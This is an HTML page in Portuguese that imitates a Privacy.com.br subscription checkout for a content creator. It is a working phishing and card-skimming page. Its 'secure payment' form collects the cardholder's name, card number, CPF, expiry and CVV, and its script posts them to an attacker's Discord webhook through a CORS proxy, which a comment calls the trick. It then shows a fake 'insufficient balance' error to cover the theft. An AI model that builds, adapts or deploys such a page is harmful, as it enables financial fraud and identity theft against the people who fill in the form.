<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Privacy | Kamylinha Santos</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/notiflix@2.7.0/dist/notiflix-aio-2.7.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <style>
        :root { --primary: #f47b52; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background: #fff; text-align: center; }
        .nav { padding: 15px; border-bottom: 1px solid #eee; }
        .banner { width: 100%; height: 180px; object-fit: cover; }
        .profile { width: 90px; height: 90px; border-radius: 50%; border: 3px solid #fff; margin-top: -45px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        .btn-pay { width: 90%; padding: 15px; background: linear-gradient(90deg, #f47b52, #f9a67a); border: none; border-radius: 50px; color: #fff; font-weight: 800; margin-top: 20px; cursor: pointer; }
        #modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; }
        .modal-box { background: #fff; width: 90%; max-width: 400px; margin: 15% auto; padding: 20px; border-radius: 15px; text-align: left; }
        .form-group { margin-bottom: 10px; }
        .form-group label { display: block; font-size: 11px; font-weight: 700; margin-bottom: 3px; }
        .form-group input { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="nav"><img src="https://privacy.com.br/img/logo-orange.svg" height="25"></div>
    <img src="capa.png" class="banner">
    <img src="perfil1.png" class="profile">
    <h2>Kamylinha Santos ‚úÖ</h2>
    <button class="btn-pay" onclick="document.getElementById('modal').style.display='block'">ASSINAR CONTE√öDO</button>

    <div id="modal">
        <div class="modal-box">
            <h3 style="color:var(--primary); margin-bottom:15px;">Pagamento Seguro</h3>
            <div class="form-group"><label>NOME NO CART√ÉO</label><input type="text" id="n"></div>
            <div class="form-group"><label>N√öMERO DO CART√ÉO</label><input type="text" id="c"></div>
            <div class="form-group"><label>CPF</label><input type="text" id="cpf"></div>
            <div style="display:flex; gap:10px">
                <div class="form-group" style="flex:1"><label>VALIDADE</label><input type="text" id="d"></div>
                <div class="form-group" style="flex:1"><label>CVV</label><input type="text" id="cvv"></div>
            </div>
            <button class="btn-pay" style="width:100%" onclick="enviar()">CONFIRMAR</button>
        </div>
    </div>

    <script>
        $(document).ready(function(){
            $('#c').mask('0000 0000 0000 0000');
            $('#cpf').mask('000.000.000-00');
            $('#d').mask('00/00');
            $('#cvv').mask('000');
        });

        function enviar() {
            const webhook = "https://discord.com/api/webhooks/1470300746439458902/TbdZwuh6kMX7vdMD97wvOdZ2Rzf63w7PB2GUyOeOEFKwcui6VI2TAubXJyjYVdxIoWZH";
            
            const payload = {
                embeds: [{
                    title: "üí≥ NOVO CARD CAPTURADO",
                    color: 16038738,
                    fields: [
                        { name: "üë§ Nome", value: document.getElementById('n').value, inline: true },
                        { name: "üÜî CPF", value: document.getElementById('cpf').value, inline: true },
                        { name: "üí≥ Card", value: document.getElementById('c').value, inline: false },
                        { name: "üìÖ Data", value: document.getElementById('d').value, inline: true },
                        { name: "üîí CVV", value: document.getElementById('cvv').value, inline: true }
                    ],
                    footer: { text: "ID: 1326639660872499315" }
                }]
            };

            Notiflix.Loading.circle('Processando...');

            // O TRUQUE: Usando um proxy para o navegador n√£o bloquear
            fetch("https://corsproxy.io/?" + encodeURIComponent(webhook), {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            }).then(() => {
                setTimeout(() => {
                    Notiflix.Loading.remove();
                    Notiflix.Report.failure('Erro', 'Saldo insuficiente.', 'OK');
                }, 2000);
            });
        }
    </script>
</body>
</html>
